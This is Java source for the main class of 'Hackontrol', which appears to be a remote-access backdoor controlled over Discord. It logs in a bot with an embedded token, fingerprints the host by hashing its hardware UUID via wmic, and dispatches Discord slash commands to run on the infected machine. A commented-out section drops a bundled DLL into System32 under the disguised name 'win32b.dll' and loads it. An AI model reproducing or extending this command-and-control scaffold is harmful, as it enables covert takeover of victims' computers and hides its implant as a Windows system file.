package com.khopan.hackontrol;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Random;

import com.khopan.hackontrol.command.CommandManager;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.commands.Command;
import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	private static final String LIBRARY_NAME = "win32b.dll";

	private final JDA bot;
	private final Map<Command, com.khopan.hackontrol.command.Command> map;

	private Hackontrol(JDA bot, String machineIdentifier) {
		this.bot = bot;
		this.map = new LinkedHashMap<>();
		this.bot.addEventListener(new Listener());
		CommandManager.register(this :: register);
	}

	private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
		if(commandClass == null) {
			return;
		}

		com.khopan.hackontrol.command.Command command;

		try {
			command = commandClass.getConstructor().newInstance();
		} catch(Throwable Errors) {
			return;
		}

		SlashCommandData data = command.getCommand();
		Command botCommand;

		try {
			botCommand = this.bot.upsertCommand(data).complete();
		} catch(Throwable Errors) {
			return;
		}

		this.map.put(botCommand, command);
	}

	private void onSlashCommand(SlashCommandInteractionEvent Event) {
		long identifier = Event.getCommandIdLong();
		Iterator<Entry<Command, com.khopan.hackontrol.command.Command>> iterator = this.map.entrySet().iterator();

		while(iterator.hasNext()) {
			Entry<Command, com.khopan.hackontrol.command.Command> entry = iterator.next();
			Command key = entry.getKey();
			com.khopan.hackontrol.command.Command value = entry.getValue();

			if(key.getIdLong() != identifier) {
				continue;
			}

			new Thread(() -> value.handleCommand(Event)).start();
			return;
		}
	}

	public static void main(String[] args) throws Throwable {
		/*String windowsDirectoryPath = System.getenv("windir");

		if(windowsDirectoryPath == null) {
			System.exit(1);
			return;
		}

		File windowsDirectory = new File(windowsDirectoryPath);

		if(!windowsDirectory.exists()) {
			System.exit(1);
			return;
		}

		File system32Directory = new File(windowsDirectory, "System32");

		if(!system32Directory.exists()) {
			System.exit(1);
			return;
		}

		File win32Library = new File(system32Directory, "win32c.dll");
		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
		InputStream stream = Hackontrol.class.getResourceAsStream("Hackontrol.dll");
		byte[] data = stream.readAllBytes();
		stream.close();

		try {
			FileOutputStream output = new FileOutputStream(libraryFile);
			output.write(data);
			output.close();
		} catch(Throwable Errors) {

		}

		System.load(libraryFile.getAbsolutePath());*/
		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
				.build();

		try {
			bot.awaitReady();
		} catch(Throwable ignored) {
			return;
		}

		String machineIdentifier = Hackontrol.getMachineId();
		new Hackontrol(bot, machineIdentifier);
	}

	private static String getMachineId() {
		ProcessBuilder processBuilder = new ProcessBuilder("wmic", "csproduct", "get", "uuid");
		processBuilder.redirectErrorStream(true);
		Process process;

		try {
			process = processBuilder.start();
		} catch(Throwable ignored) {
			return Hackontrol.getRandomMachineId();
		}

		InputStream stream = process.getInputStream();
		BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
		StringBuilder stringBuilder = new StringBuilder();
		String line;

		try {
			while((line = reader.readLine()) != null) {
				stringBuilder.append(line);
			}
		} catch(Throwable ignore) {
			return Hackontrol.getRandomMachineId();
		}

		String result = stringBuilder.toString();
		int length = result.length();

		if(length < 5) {
			return Hackontrol.getRandomMachineId();
		}

		StringBuilder idBuilder = new StringBuilder();

		for(int i = 4; i < length; i++) {
			char character = result.charAt(i);

			if(!Hackontrol.isHex(character)) {
				continue;
			}

			idBuilder.append(character);
		}

		MessageDigest digest;

		try {
			digest = MessageDigest.getInstance("SHA-1");
		} catch(Throwable ignored) {
			return Hackontrol.getRandomMachineId();
		}

		String identifierText = idBuilder.toString();
		byte[] identifierBytes = identifierText.getBytes(StandardCharsets.UTF_8);
		byte[] hashedBytes = digest.digest(identifierBytes);
		StringBuilder hashBuilder = new StringBuilder();

		for(int i = 0; i < hashedBytes.length; i++) {
			hashBuilder.append(String.format("%02x", hashedBytes[i]).toLowerCase());
		}

		return hashBuilder.toString();
	}

	private static String getRandomMachineId() {
		Random random = new Random(System.nanoTime() - System.currentTimeMillis());
		char[] hexMap = new char[] {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
		StringBuilder builder = new StringBuilder();

		for(int i = 0; i < 40; i++) {
			double value = random.nextDouble();
			int index = Math.min(Math.max((int) Math.round(value * 15.0d), 0), 15);
			builder.append(hexMap[index]);
		}

		return builder.toString();
	}

	private static boolean isHex(char character) {
		switch(character) {
		case '0':
		case '1':
		case '2':
		case '3':
		case '4':
		case '5':
		case '6':
		case '7':
		case '8':
		case '9':
		case 'a':
		case 'b':
		case 'c':
		case 'd':
		case 'e':
		case 'f':
		case 'A':
		case 'B':
		case 'C':
		case 'D':
		case 'E':
		case 'F':
			return true;
		}

		return false;
	}

	private class Listener extends ListenerAdapter {
		@Override
		public void onSlashCommandInteraction(SlashCommandInteractionEvent Event) {
			Hackontrol.this.onSlashCommand(Event);
		}
	}
}
